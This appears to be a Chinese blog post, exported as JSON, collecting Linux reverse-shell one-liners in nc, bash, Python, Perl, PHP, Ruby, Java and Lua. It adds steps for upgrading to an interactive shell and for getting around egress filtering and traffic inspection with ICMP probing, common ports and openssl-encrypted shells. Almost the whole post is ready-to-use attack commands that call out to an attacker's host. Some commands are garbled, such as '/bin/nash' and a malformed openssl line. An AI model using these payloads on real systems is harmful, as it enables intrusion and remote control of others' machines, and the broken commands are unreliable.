{"title":"2019-03-25-Linux反弹shell的一些方法","slug":"2019-03-25-Linux反弹shell的一些方法","date":"2019-10-17T14:44:49.000Z","updated":"2019-10-17T15:52:40.694Z","comments":true,"excerpt":"","content":"<blockquote>\n<p>Linux反弹shell方法的一些总结</p>\n</blockquote>\n<h5 id=\"NC\"><a href=\"#NC\" class=\"headerlink\" title=\"NC\"></a>NC</h5><pre><code>nc 192.168.1.2 8080 -t -e /bin/bash\n</code></pre><h5 id=\"Bash\"><a href=\"#Bash\" class=\"headerlink\" title=\"Bash\"></a>Bash</h5><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.2/8080 0&gt;&amp;1\n</code></pre><h5 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h5><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.2&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;\n</code></pre><h5 id=\"Perl\"><a href=\"#Perl\" class=\"headerlink\" title=\"Perl\"></a>Perl</h5><pre><code>perl -e &apos;use Socket;$i=&quot;192.168.1.2&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;\n</code></pre><h5 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h5><pre><code>php -r &apos;$sock=fsockopen(&quot;192.168.1.2&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;\n</code></pre><h5 id=\"ruby\"><a href=\"#ruby\" class=\"headerlink\" title=\"ruby\"></a>ruby</h5><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;\n</code></pre><h5 id=\"java\"><a href=\"#java\" class=\"headerlink\" title=\"java\"></a>java</h5><pre><code>r = Runtime.getRuntime()\np = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])\np.waitFor()\n</code></pre><h5 id=\"Lua\"><a href=\"#Lua\" class=\"headerlink\" title=\"Lua\"></a>Lua</h5><pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;10.0.0.1&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;\n</code></pre><h5 id=\"反弹成功获取交互式shell\"><a href=\"#反弹成功获取交互式shell\" class=\"headerlink\" title=\"反弹成功获取交互式shell\"></a>反弹成功获取交互式shell</h5><pre><code>1.python -c &apos;import pty;pty.spawn(&quot;/bin/nash&quot;)&apos;\n2.输入ctrl-z，输入执行：stty raw -echo ; fg\n3.ctrl-l，执行：reset ； export SHELL=bash ; export TERM=xterm-256color ; stty rows 54 columns\n</code></pre><h5 id=\"反弹shell失败的几种常见原因\"><a href=\"#反弹shell失败的几种常见原因\" class=\"headerlink\" title=\"反弹shell失败的几种常见原因\"></a>反弹shell失败的几种常见原因</h5><h6 id=\"nc不支持-e参数\"><a href=\"#nc不支持-e参数\" class=\"headerlink\" title=\"nc不支持-e参数\"></a>nc不支持-e参数</h6><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\nnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999\n</code></pre><h6 id=\"禁止出口流量\"><a href=\"#禁止出口流量\" class=\"headerlink\" title=\"禁止出口流量\"></a>禁止出口流量</h6><pre><code>1.目标执行ping，获取实际包大小：ping -s64 -c1 192.168.1.2      （系统发送的字节，假如118）\n2.vps监控icmp日志：tcpdump -i eth0 -n -v icmp | grep -i &quot;length 118&quot;\n3.再次ping -s64 -c1 192.168.1.2\n4.vps上查看118字节的数据包\n</code></pre><h6 id=\"限制向外访问端口\"><a href=\"#限制向外访问端口\" class=\"headerlink\" title=\"限制向外访问端口\"></a>限制向外访问端口</h6><pre><code>1.采用白名单或者黑名单限制方法\n2.监听999端口，访问该端口http服务，vps没http记录，则为白名单过滤\n3.解决方案，采用常规端口，如21，22，23，80，443\n</code></pre><h6 id=\"流量审查\"><a href=\"#流量审查\" class=\"headerlink\" title=\"流量审查\"></a>流量审查</h6><pre><code>1.通过openssl加密流量\n2.vps生成SSL证书公钥/私钥：openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n3.vps监听反弹shell：openssl s_server -quiet -key.pem -cert cer.pem -port 443\n4.目标上openssl加密流量：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|openssl s_server -quiet -key.pem -cert cer.pem -port 443 &gt;/tmp/f\n</code></pre><h5 id=\"参考连接\"><a href=\"#参考连接\" class=\"headerlink\" title=\"参考连接\"></a>参考连接</h5><p><a href=\"https://www.freebuf.com/vuls/211847.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/vuls/211847.html</a></p>\n<p><a href=\"https://www.waitalone.cn/linux-shell-rebound-under-way.html\" target=\"_blank\" rel=\"noopener\">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>\n","categories":[],"tags":[]}